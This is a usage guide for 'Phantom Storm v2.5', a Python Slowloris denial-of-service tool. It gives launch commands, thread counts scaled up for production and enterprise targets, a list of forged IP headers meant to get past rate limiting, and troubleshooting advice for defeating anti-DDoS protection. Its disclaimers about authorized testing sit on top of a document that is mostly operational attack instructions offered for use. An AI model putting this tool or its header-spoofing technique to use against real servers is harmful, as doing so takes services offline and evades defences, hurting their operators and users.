# 🚀 Quick Usage Guide - Phantom Storm v2.5

## Basic Syntax

```bash
python phantom_storm.py <TARGET_IP> <PORT> <THREADS> [--no-spoof]
```

---

## Common Use Cases

### 1. Attack with IP Spoofing (Recommended)

```bash
# Bypass rate limiting with fake IPs
python phantom_storm.py 192.168.1.100 80 200
```

**Result**: Each connection uses different spoofed IP in headers

---

### 2. Attack without IP Spoofing

```bash
# Pure Slowloris attack
python phantom_storm.py 192.168.1.100 80 200 --no-spoof
```

**Result**: All connections from your real IP

---

### 3. Local Testing

```bash
# Test local server (spoofing not needed)
python phantom_storm.py 127.0.0.1 8080 50 --no-spoof
```

---

## Quick Parameter Guide

| Threads | Use Case |
|---------|----------|
| 20-50 | Local dev server, low-power target |
| 100-200 | Small web servers, internal testing |
| 200-300 | Production servers with rate limiting |
| 300-500+ | Load balancers, enterprise targets |

---

## What to Expect

### On Start:
1. Legal disclaimer display
2. Authorization check (type: `YES I AM AUTHORIZED`)
3. Target validation
4. Attack begins

### During Attack:
```
[Runtime: 00:03:45]
├─ Active Connections    : 187
├─ Total Established     : 1,234
├─ Success Rate          : 95.67%
├─ Unique IPs Used       : 1,189  ← (if spoofing enabled)
└─ IP Diversity          : 96.35%
```

### To Stop:
- Press `Ctrl + C`
- View final statistics
- Check log file in `logs/` folder

---

## Bypass Headers Injected (v2.5)

When IP spoofing is enabled, each request includes:

```
X-Forwarded-For: <random_IP>
X-Real-IP: <random_IP>
X-Client-IP: <random_IP>
X-Originating-IP: <random_IP>
Client-IP: <random_IP>
True-Client-IP: <random_IP>
CF-Connecting-IP: <random_IP>
X-ProxyUser-IP: <random_IP>
Via: HTTP/1.1 <proxy_IP1>, HTTP/2.0 <proxy_IP2>
```

These headers trick servers into thinking requests come from different sources.

---

## Log Files

Automatically created in `logs/` folder:
```
logs/phantom_storm_20241215_143022.log
```

Contains:
- Start/stop times
- Target information
- Error details
- Final statistics

---

## Troubleshooting

### High failure rate?
- Target may have strong anti-DDoS
- Reduce threads: `python phantom_storm.py <IP> <PORT> 100`
- Try with spoofing if not already enabled

### "OSError: Too many open files"?
- Reduce threads (your OS limit)
- On Linux: `ulimit -n 4096`

### Not seeing colors?
- Use modern terminal (Windows Terminal, PowerShell 7+)
- Colors work automatically on Linux/Mac

---

## Best Practices

1. ✅ **Always get written permission** before testing
2. ✅ **Start with lower threads** and increase gradually
3. ✅ **Monitor logs** to understand target behavior
4. ✅ **Use spoofing** when testing rate limiting
5. ✅ **Test in controlled lab** environment only

---

## Need More Help?

- Full documentation: `README.md`
- Version changes: `CHANGELOG.md`
- Legal info: See disclaimer in README

---

**⚠️ Remember: Only use on systems you own or have explicit permission to test!**
